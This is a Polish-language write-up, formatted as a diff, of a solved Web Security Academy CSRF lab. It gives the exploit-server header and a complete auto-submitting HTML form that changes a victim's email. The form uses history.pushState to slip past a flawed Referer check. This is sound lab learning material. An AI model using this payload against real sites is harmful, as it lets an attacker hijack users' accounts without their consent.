@@ -1,0 +1,50 @@
+• Rozwiązałem to przez poprawne użycie exploit servera. Kluczowe były dwie rzeczy:
+
+  1. Referrer-Policy musi być nagłówkiem HTTP w polu Head, a nie tekstem wewnątrz <head>.
+  2. Po STORE exploita trzeba rzeczywiście uruchomić Deliver to victim.
+
+  W polu Head EXPLOIT SERVERAustawiłem:
+
+  HTTP/1.1 200 OK
+  Content-Type: text/html; charset=utf-8
+  Referrer-Policy: unsafe-url
+
+  W polu Body:
+
+  <html>
+  <body>
+    <form action="https://0a3d006d0416f5c7801c4e280052006e.web-security-academy.net/my-account/change-
+    email"
+          method="POST">
+      <input type="hidden"
+             name="email"
+             value="victim-739204@example.net">
+    </form>
+
+    <script>
+      history.pushState(
+        "",
+        "",
+        "/?0a3d006d0416f5c7801c4e280052006e.web-security-academy.net"
+      );
+
+      document.forms[0].submit();
+    </script>
+  </body>
+  </html>
+
+          ↓
+  history.pushState dodaje domenę laboratorium do adresu
+          ↓
+  Formularz wysyła POST /my-account/change-email
+          ↓
+  Referrer-Policy: unsafe-url zachowuje cały Referer
+          ↓
+  Referer zawiera domenę laboratorium w query stringu
+          ↓
+  Błędna walidacja akceptuje żądanie
+
+  W efekcie Referer ma postać zbliżoną do:
+
+  Referer:
+  https://exploit-0a8700f00463f56480c74dec01d700bc.exploit-server.net/?0a3d006d0416f5c7801c4e280052006e.web-security-academy.net                       
